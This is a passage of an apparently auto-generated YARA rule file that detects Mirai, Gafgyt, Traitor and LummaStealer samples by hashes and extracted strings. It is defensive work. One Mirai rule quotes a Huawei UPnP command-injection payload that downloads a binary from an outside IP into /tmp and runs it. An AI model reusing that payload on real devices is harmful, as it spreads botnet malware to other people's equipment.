      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os/exec.(*Error).Unwrap" fullword ascii /* score: '15.00'*/
      $s2 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s3 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s4 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.adjustSignalStack" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.sigsave" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.doSigPreempt" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.signalM" fullword ascii /* score: '10.00'*/
      $s9 = "os.statNolog.func1" fullword ascii /* score: '9.00'*/
      $s10 = "internal/testlog.PanicOnExit0" fullword ascii /* score: '9.00'*/
      $s11 = "syscall.Getuid" fullword ascii /* score: '8.00'*/
      $s12 = "internal/syscall/execenv.Default" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739_25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963_44 {
   meta:
      description = "dropzone - from files 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash2 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash3 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash4 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash5 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os.(*fileStat).Sys" fullword ascii /* score: '19.00'*/
      $s2 = "runtime.closeonexec" fullword ascii /* score: '15.00'*/
      $s3 = "syscall.CloseOnExec" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.addtimer" fullword ascii /* score: '10.00'*/
      $s5 = "reflect.cvtStringRunes" fullword ascii /* score: '10.00'*/
      $s6 = "reflect.cvtComplex" fullword ascii /* score: '10.00'*/
      $s7 = "reflect.New" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.siftupTimer" fullword ascii /* score: '10.00'*/
      $s9 = "reflect.(*rtype).Key" fullword ascii /* score: '10.00'*/
      $s10 = "reflect.Value.runes" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.siftdownTimer" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.FuncForPC" fullword ascii /* score: '10.00'*/
      $s13 = "reflect.Value.setRunes" fullword ascii /* score: '10.00'*/
      $s14 = "reflect.makeComplex" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.deltimer" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0xfacf or uint16(0) == 0x457f ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__008a0633_Ga_gyt_signature__32a0e9cf_Ga_gyt_signature__3a25ba06_Ga_gyt_signature__50ccd1fc_Ga_gyt_signatur_45 {
   meta:
      description = "dropzone - from files Ga-gyt(signature)_008a0633.elf, Ga-gyt(signature)_32a0e9cf.elf, Ga-gyt(signature)_3a25ba06.elf, Ga-gyt(signature)_50ccd1fc.elf, Ga-gyt(signature)_75dbd19e.elf, Ga-gyt(signature)_9aae4780.elf, Ga-gyt(signature)_b88bb101.elf, Ga-gyt(signature)_d3b03295.elf, Ga-gyt(signature)_e6f098d1.elf, Ga-gyt(signature)_fe370751.elf, Mirai(signature)_0116c02e.elf, Mirai(signature)_01b09801.elf, Mirai(signature)_0465a46a.elf, Mirai(signature)_16679148.elf, Mirai(signature)_216b5870.elf, Mirai(signature)_22460aec.elf, Mirai(signature)_28c0c6f2.elf, Mirai(signature)_2ef19b86.elf, Mirai(signature)_33489905.elf, Mirai(signature)_3508b667.elf, Mirai(signature)_3f0366c3.elf, Mirai(signature)_4702ad6e.elf, Mirai(signature)_555d3ba4.elf, Mirai(signature)_5a0ba275.elf, Mirai(signature)_5fd8490d.elf, Mirai(signature)_6266d46e.elf, Mirai(signature)_6d8090fe.elf, Mirai(signature)_71b35d48.elf, Mirai(signature)_7715522e.elf, Mirai(signature)_9a647936.elf, Mirai(signature)_a0412e1b.elf, Mirai(signature)_a155fa86.elf, Mirai(signature)_b2d7bf97.elf, Mirai(signature)_b63c273a.elf, Mirai(signature)_bece8d68.elf, Mirai(signature)_cd3b6a5d.elf, Mirai(signature)_ce7aaa40.elf, Mirai(signature)_daf526aa.elf, Mirai(signature)_dc1c46ab.elf, Mirai(signature)_ecf09a4e.elf, Mirai(signature)_f279e2ac.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "008a06339d65629a6ada81d739e6f23e9197002f58c735381a00a5a10140697d"
      hash2 = "32a0e9cf77caa71ae112c52795b6cad3b189717e28d39c414c537e0231ff5004"
      hash3 = "3a25ba069799575e4d4ef758b6e07ab00bd70399040ae3e0992a4bf6fca69d3d"
      hash4 = "50ccd1fcaea58a4ce16e7602e3b4b053acc09040a64a5604a41cfb3a53d8c2a4"
      hash5 = "75dbd19e0a8e366a15d30708eef0c12d01aa6548721608992d6670de0cac41cb"
      hash6 = "9aae4780860f3e62025d06c5db6f2a4f52488cf8070b33897e6f049881929b83"
      hash7 = "b88bb101d8d2e3a231b9a3c9069660ec2724438ab5712e58dac4259f097df371"
      hash8 = "d3b03295103fc12026e27daf37c67083b983fc04ad17a9c87e66324aeca8b3cb"
      hash9 = "e6f098d1f18250a05e845ac6d402beb3adfc173a8124d53e8de9a2905cafce15"
      hash10 = "fe3707512efc513a0ed8a89b592b2db9343666546f1b5580f9f1c807e34c405a"
      hash11 = "0116c02eca6948a401ca7051dbd92039dab15135be910f9ebfee9954811380fe"
      hash12 = "01b098017e4c385ca6e13515068c8444938cfc2800b274abe49fca958f45505d"
      hash13 = "0465a46a9ac27e8d41e3a9d47710b7e6b92ed56c458ee49ebd38cacdac75a571"
      hash14 = "16679148a73f7b8b1339f778847904d30cc3ca10d6d07674184947fc3e6a6f92"
      hash15 = "216b587035143c7e370c3017a72132b32638157b2751d7e0efd8d5b8b1e90a94"
      hash16 = "22460aec59eded810bc76f0fc6c974da617f23c5167ba1c35c26a90e2c50a96d"
      hash17 = "28c0c6f22376f482b2237f241de64f8a848d0ae4768bc98bf4699f17f68c57ca"
      hash18 = "2ef19b863a897ed20f534f434e4cafd6198d218d3b77f88b03bf4767de08635b"
      hash19 = "334899051b2d93c935b393d71d1f238bf2543b48e059564626e9b277702318a5"
      hash20 = "3508b6675ca30ad3623a338a59e90b4305049aa36e13f5e05a5c89f9603bec5c"
      hash21 = "3f0366c3eb2026f0237e1caeed26bf6e6a89327aa48013f23d9875ca539fb2b2"
      hash22 = "4702ad6ee46635683cbe2fe03a8bdb1fa2a7201207584875b6b21f3ed8544ff9"
      hash23 = "555d3ba4af0532c369c9ef053f97f6260b143cf03502d290154f7458bdb47b14"
      hash24 = "5a0ba275171dc66897f22e85cc70aa65dc6538351780d980d95ea3b5a7decb44"
      hash25 = "5fd8490d3ca5ae394125c37d7bd5b4d5f1cf4dc5010558589f610c0e8a04bfe8"
      hash26 = "6266d46e4f3ee5d24b72fd02f452b18a8bddc495682fd1bb2d274e5818487bff"
      hash27 = "6d8090fec672f53c725b8113852f711172922038c08439fd14c8e1f4a3f7fb99"
      hash28 = "71b35d489400e96742ba71eca91742c5d16b11ab66ce5719f251b2780469724d"
      hash29 = "7715522e127200b11414fdcb56e50b61fcde115fa124bc0287c92ff81eb0ca78"
      hash30 = "9a64793664809d33c338753c00f4958f8656241ff66c69ec8e8b143843aa484b"
      hash31 = "a0412e1b5ffb39535e98af7bf1118edafc290950f4e8e6b950905c8714578c7c"
      hash32 = "a155fa86c4f96777815a3d6a389d98048a4f953cec629601b21201859d0757a6"
      hash33 = "b2d7bf979e0e91c4798fea5c6aaa8dbf358ecab20bebe4a0a7cefbe6656d90ba"
      hash34 = "b63c273ae02c39024b2b690bd6ba4f4099682f12a2f3550ac50a0848e7d2c5f4"
      hash35 = "bece8d68425990bdfc1dc6b3d09bc9fe826a78c6e1bc3bd00c48c6124496d338"
      hash36 = "cd3b6a5d4392242cc662c7afef6cd3753445e837282de24a7da46641d9525e10"
      hash37 = "ce7aaa40299615aa09958e1399dfc39c268c57309c350d0d49b929a5f1a11655"
      hash38 = "daf526aaf88b04ac0a046fcc5e1de4d13f57a35fe525b4fcc909d63fcfd812c9"
      hash39 = "dc1c46abc78807ee50f22a58f75df1b7a7f05d7cdb1d1b4036fba0cc6ec19d25"
      hash40 = "ecf09a4e4a1fa563ae7e567dbd8ba42157ae83d06cc55638e683a709c9cbb51a"
      hash41 = "f279e2ac99f4355d95769db41066accd329183ac12296c09a7beeafc491daa50"
   strings:
      $s1 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s4 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s5 = "__GI_tcgetattr" fullword ascii /* score: '9.00'*/
      $s6 = "__GI_getsockname" fullword ascii /* score: '9.00'*/
      $s7 = "getppid.c" fullword ascii /* score: '9.00'*/
      $s8 = "getgid.c" fullword ascii /* score: '9.00'*/
      $s9 = "getpid.c" fullword ascii /* score: '9.00'*/
      $s10 = "geteuid.c" fullword ascii /* score: '9.00'*/
      $s11 = "tcgetattr.c" fullword ascii /* score: '9.00'*/
      $s12 = "__GI_getegid" fullword ascii /* score: '9.00'*/
      $s13 = "getsockname.c" fullword ascii /* score: '9.00'*/
      $s14 = "getuid.c" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__03c0aa47_Mirai_signature__0af949db_Mirai_signature__0bc1d414_Mirai_signature__10a16816_Mirai_signature__13_46 {
   meta:
      description = "dropzone - from files Mirai(signature)_03c0aa47.elf, Mirai(signature)_0af949db.elf, Mirai(signature)_0bc1d414.elf, Mirai(signature)_10a16816.elf, Mirai(signature)_13c2e45c.elf, Mirai(signature)_19addd46.elf, Mirai(signature)_201cf10b.elf, Mirai(signature)_2883a01c.elf, Mirai(signature)_28c0c6f2.elf, Mirai(signature)_2f3b73c5.elf, Mirai(signature)_33489905.elf, Mirai(signature)_3630d0b3.elf, Mirai(signature)_5408157a.elf, Mirai(signature)_5a0ba275.elf, Mirai(signature)_5b742ef2.elf, Mirai(signature)_6733cd6a.elf, Mirai(signature)_67e8a934.elf, Mirai(signature)_6da861ce.elf, Mirai(signature)_71b35d48.elf, Mirai(signature)_74e88829.elf, Mirai(signature)_74ec75a2.elf, Mirai(signature)_74f3bd17.elf, Mirai(signature)_75017b84.elf, Mirai(signature)_7abf04aa.elf, Mirai(signature)_83ca802d.elf, Mirai(signature)_83d2ee29.elf, Mirai(signature)_843c0191.elf, Mirai(signature)_9036349d.elf, Mirai(signature)_97c142b9.elf, Mirai(signature)_a122737c.elf, Mirai(signature)_a4366f9e.elf, Mirai(signature)_a9713718.elf, Mirai(signature)_aae70473.elf, Mirai(signature)_ac77dea6.elf, Mirai(signature)_b14fb3d2.elf, Mirai(signature)_b5b805f0.elf, Mirai(signature)_be00501a.elf, Mirai(signature)_c6407647.elf, Mirai(signature)_ca1dbf24.elf, Mirai(signature)_cee28b06.elf, Mirai(signature)_d2890a93.elf, Mirai(signature)_d7db5d02.elf, Mirai(signature)_dc1c46ab.elf, Mirai(signature)_e58625c8.elf, Mirai(signature)_e78c1e09.elf, Mirai(signature)_f05ae503.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "03c0aa479424e0fa6ba4f83a32dc4c945cdb2610ff4ab606563b98592ecbf220"
      hash2 = "0af949db182b50afc760f0b7488ab9f82b603fbdc08586a9c10ed100bec3d249"
      hash3 = "0bc1d414910956f654cd44cf6adcbb3af3db8ebebc2b69155c569ed074ef446d"
      hash4 = "10a16816b4e2958c1bc027b4060503c924365a160d11cebdedac8d04f30620b8"
      hash5 = "13c2e45c55992fa6f02022b3cda8525d9a66f8e9fc842eff056759ca5d3f8aa2"
      hash6 = "19addd461e46630506b49099603c4910281eb64454c7d7c8628e082c435df5a5"
      hash7 = "201cf10b7a8dd23be5926fc167da2f2848c6d916843277cef1e4cb7ee527777e"
      hash8 = "2883a01c230a8a9e5578d603ccf0341ca00adfda70852954cac8b701972d2182"
      hash9 = "28c0c6f22376f482b2237f241de64f8a848d0ae4768bc98bf4699f17f68c57ca"
      hash10 = "2f3b73c52d757826d94d5ae897dcdbaf0e611ef3a9d11e3c074cfac60d9519f9"
      hash11 = "334899051b2d93c935b393d71d1f238bf2543b48e059564626e9b277702318a5"
      hash12 = "3630d0b35f1883044a7cc304d72007bc2bafbda4fb8ede2c848541c4e002ee74"
      hash13 = "5408157aae234b88549d499aa551f55fcdd60b0b716496460a00417a193056bc"
      hash14 = "5a0ba275171dc66897f22e85cc70aa65dc6538351780d980d95ea3b5a7decb44"
      hash15 = "5b742ef26990a70207d0bed4b9353abe6604a00e58658271c27c92e9e87b9c41"
      hash16 = "6733cd6a8cf7338a6835beadd1f393d4916bec7f8615cbb74f3d4e7f649f6f77"
      hash17 = "67e8a9340c7af1d842a040fb76b92ac213ae430773126c4a4d59aa88fb792f2c"
      hash18 = "6da861cedb1e2ba6915c98364f991be48f931d0e49f5ad50684e103385920927"
      hash19 = "71b35d489400e96742ba71eca91742c5d16b11ab66ce5719f251b2780469724d"
      hash20 = "74e888299a6645a5bcc0ec551cd1a338bd9757851218828470966c2ba9e61e05"
      hash21 = "74ec75a21b2332488159d790d7681ed346e3cf3dd7377508acf91530f89546e4"
      hash22 = "74f3bd179db6ddb7e95ee349ef5e7d8cb0f580e683aaadef821ecc91ae4700ea"
      hash23 = "75017b84ada6ee1065b465c9cc2292de355d9eb06f614fa3070289be607aaff3"
      hash24 = "7abf04aae33ce14e0fbf0c39159cbc858763134e113f9998331257f05e10dd15"
      hash25 = "83ca802d00286adbd1230da62a5ad409a8b7a63e1cbf0cd0dc8d8f6edaa0d7b5"
      hash26 = "83d2ee29537d8d9e67b5d12ad241e3e9ff2116a6873cb6e6e82afd16125a4fa2"
      hash27 = "843c0191731c2568850d70eb171ca61d4f13ff7d82586251b08a0fda5b7821e7"
      hash28 = "9036349dda489a19fcd7831ed910253368b733f2ac380cd8a18417dc5ab21ded"
      hash29 = "97c142b929e020549f6ef6ca10aa8c07492027918babfb6b4a6178a8a13da1e1"
      hash30 = "a122737caf195ba8774afd8edc0360b2a52b61ecca7f9c0331edab2a1679179d"
      hash31 = "a4366f9e2c99fd643f066af7245d3a3dd867d8dac74699e9637ed50eb584f762"
      hash32 = "a97137181f1950dfb0dfc5e250c70d70d0bfa102a026f2373507c9653bb412ab"
      hash33 = "aae70473a6a730445f784a81835cf12d7b9c425f41a11a287769511b6b8d3382"
      hash34 = "ac77dea67f5b84dd19b291c2b8143b6b465b19177945ac22858e16cda594e108"
      hash35 = "b14fb3d2e411cdce57d9cec859b390d28ef72a1a7b6aa9ee18fc22971504d8a1"
      hash36 = "b5b805f0100b455afec35b83534ffdabb602efe869c9bba0434a255487c42e2d"
      hash37 = "be00501a717f8fc5f88bc1976097f6f391ce3bcbe695a7a1c0d0e6000f84fd4b"
      hash38 = "c6407647d371be30a86c48b8f546f2638df69039bb3121718131810ceb6363bd"
      hash39 = "ca1dbf2404696a03d2c90fc4531a171eec2e0c3b95a435f29f1ac492f327fce4"
      hash40 = "cee28b062d3e0c4baed1cab2481bf92336c80cf5ba7f75fc9685af304b5d0ee4"
      hash41 = "d2890a937a490a105ca269aded1cc32ffaf4a6ef08393b33d252d7393c634fbe"
      hash42 = "d7db5d021b4d275a5d30bf2321464c4c1c42cd19e7bbe762fb67b6e58ff5a301"
      hash43 = "dc1c46abc78807ee50f22a58f75df1b7a7f05d7cdb1d1b4036fba0cc6ec19d25"
      hash44 = "e58625c8078782ba4ccac7c25fdaed9669471bb7d551cb3fe04234850f082c4b"
      hash45 = "e78c1e0933c16f521f93fedc46ad461f58b189f7eb8d4ecd984082abe6af3b0d"
      hash46 = "f05ae5031d5a336100b5d2880a329d675b781af9a45e45c3af31964396bbbfd8"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[DEBUG] Target %d ready: %s:%d" fullword ascii /* score: '26.50'*/
      $s3 = " -g 192.227.134.76 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownl" ascii /* score: '20.00'*/
      $s4 = "oadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "[DEBUG] Entering flood loop" fullword ascii /* score: '9.00'*/
      $s7 = "pvsfqujplq" fullword ascii /* score: '8.00'*/
      $s8 = "pvsfqbgnjm" fullword ascii /* score: '8.00'*/
      $s9 = "brvbqjl" fullword ascii /* score: '8.00'*/
      $s10 = "gfebvow" fullword ascii /* score: '8.00'*/
      $s11 = "bgpoqllw" fullword ascii /* score: '8.00'*/
      $s12 = "lsfqbwlq" fullword ascii /* score: '8.00'*/
      $s13 = "sqfnjfq" fullword ascii /* score: '8.00'*/
      $s14 = "wfomfwbgnjm" fullword ascii /* score: '8.00'*/
      $s15 = "sbpptlqg" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1a70e911_Mirai_signature__1fd431bc_Mirai_signature__6266d46e_Mirai_signature__b7000208_47 {
   meta:
      description = "dropzone - from files Mirai(signature)_1a70e911.elf, Mirai(signature)_1fd431bc.elf, Mirai(signature)_6266d46e.elf, Mirai(signature)_b7000208.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1a70e911a5fa67eda43307589b55d6f46066b274565334e5e3ac932635f05791"
      hash2 = "1fd431bc596370daa1e383f8ee38a1c6743793429ee6e11e08a584763e4db2f6"
      hash3 = "6266d46e4f3ee5d24b72fd02f452b18a8bddc495682fd1bb2d274e5818487bff"
      hash4 = "b7000208ef11005c29728cdb5d23bec21d69186e05e4ccc1869a1c11fd237eba"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s6 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s7 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s14 = "syslogd" fullword ascii /* score: '13.00'*/
      $s15 = "postgresql" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_48 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash4 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash5 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s4 = "syscall.forkExecPipe" fullword ascii /* score: '21.00'*/
      $s5 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s6 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s7 = "os/exec.(*Cmd).writerDescriptor" fullword ascii /* score: '20.00'*/
      $s8 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
      $s9 = "os/exec.(*Cmd).argv" fullword ascii /* score: '17.00'*/
      $s10 = "os/exec.(*Cmd).Start.func1" fullword ascii /* score: '17.00'*/
      $s11 = "os/exec.(*Cmd).Start" fullword ascii /* score: '17.00'*/
      $s12 = "os/exec.(*Cmd).Start.func2" fullword ascii /* score: '17.00'*/
      $s13 = "os/exec.findExecutable" fullword ascii /* score: '16.00'*/
      $s14 = "syscall.forkExec" fullword ascii /* score: '15.00'*/
      $s15 = "os/exec.(*Error).Error" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c_LummaStealer_signature__a520fd20530cf0b0db6a6c3c8_49 {
   meta:
      description = "dropzone - from files b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash2 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
   strings:
      $x1 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $x2 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
      $s3 = "; head runtime.guintptr; tail runtime.guintptr }; sweepWaiters struct { lock runtime.mutex; head runtime.guintptr }; cycles uint" ascii /* score: '28.00'*/
      $s4 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '27.00'*/
      $s5 = "L*struct { lock runtime.mutex; head runtime.guintptr; tail runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s6 = "5*struct { lock runtime.mutex; head runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s7 = "type..eq.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struct " ascii /* score: '22.00'*/
      $s8 = "type..hash.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struc" ascii /* score: '22.00'*/
      $s9 = "e uint32; mode runtime.gcMode; userForced bool; totaltime int64; initialHeapLive uint64; assistQueue struct { lock runtime.mutex" ascii /* score: '21.00'*/
      $s10 = "{ runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked ui" ascii /* score: '18.00'*/
      $s11 = "t { runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked " ascii /* score: '18.00'*/
      $s12 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '18.00'*/
      $s13 = "utex; runtime.head runtime.guintptr }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; runtime.tSweepTerm" ascii /* score: '17.00'*/
      $s14 = "ex; runtime.head runtime.guintptr }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; runtime.tSweepTerm i" ascii /* score: '17.00'*/
      $s15 = "runtime.gosweepdone" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 9000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0465a46a_Mirai_signature__16679148_Mirai_signature__216b5870_Mirai_signature__22460aec_Mirai_signature__35_50 {
   meta:
      description = "dropzone - from files Mirai(signature)_0465a46a.elf, Mirai(signature)_16679148.elf, Mirai(signature)_216b5870.elf, Mirai(signature)_22460aec.elf, Mirai(signature)_3508b667.elf, Mirai(signature)_4702ad6e.elf, Mirai(signature)_555d3ba4.elf, Mirai(signature)_5fd8490d.elf, Mirai(signature)_7715522e.elf, Mirai(signature)_9a647936.elf, Mirai(signature)_a0412e1b.elf, Mirai(signature)_b2d7bf97.elf, Mirai(signature)_b63c273a.elf, Mirai(signature)_cd3b6a5d.elf, Mirai(signature)_daf526aa.elf, Mirai(signature)_f279e2ac.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0465a46a9ac27e8d41e3a9d47710b7e6b92ed56c458ee49ebd38cacdac75a571"
      hash2 = "16679148a73f7b8b1339f778847904d30cc3ca10d6d07674184947fc3e6a6f92"
      hash3 = "216b587035143c7e370c3017a72132b32638157b2751d7e0efd8d5b8b1e90a94"
      hash4 = "22460aec59eded810bc76f0fc6c974da617f23c5167ba1c35c26a90e2c50a96d"
      hash5 = "3508b6675ca30ad3623a338a59e90b4305049aa36e13f5e05a5c89f9603bec5c"
      hash6 = "4702ad6ee46635683cbe2fe03a8bdb1fa2a7201207584875b6b21f3ed8544ff9"
